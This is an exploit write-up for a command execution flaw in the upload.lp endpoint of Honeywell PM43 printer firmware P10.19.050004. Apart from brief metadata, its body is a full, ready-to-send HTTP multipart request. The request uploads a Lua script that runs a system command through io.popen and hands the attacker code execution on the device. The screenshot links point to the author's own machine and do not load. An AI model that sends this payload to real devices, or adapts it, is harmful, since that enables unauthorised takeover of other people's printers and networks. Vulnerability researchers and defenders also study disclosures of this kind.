

#### Exploit Title

Honeywell Products upload.lp command execution

#### Exploit Author

[webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vulnerability condition

Unlimited front desk

#### Vendor Homepage

https://www.honeywell.com

#### Version

Honeywell PM43 P10.19.050004

#### Description

There is a command execution vulnerability in Honeywell Products, through which an attacker can gain server privileges。

#### Payload used

![image-20231212105543382](/Users/w0lf/Library/Application Support/typora-user-images/image-20231212105543382.png)

```
POST /manage/upload.lp HTTP/1.1
Host: xx.xx.xx.xx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: csrf=949644229ab94d3997700449e0c73c7b2bd3b12c51a4be94f
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypQN2i3Yr
Content-Length: 261

------WebKitFormBoundarypQN2i3Yr
Content-Disposition: form-data; name="file";filename="test222.lua"

local command = "id"
local handle = io.popen(command)
local result = handle:read("*a")
print(result)
handle:close()
------WebKitFormBoundarypQN2i3Yr--
```

![image-20231212105646654](/Users/w0lf/Library/Application Support/typora-user-images/image-20231212105646654.png)

![image-20231212105658660](/Users/w0lf/Library/Application Support/typora-user-images/image-20231212105658660.png)
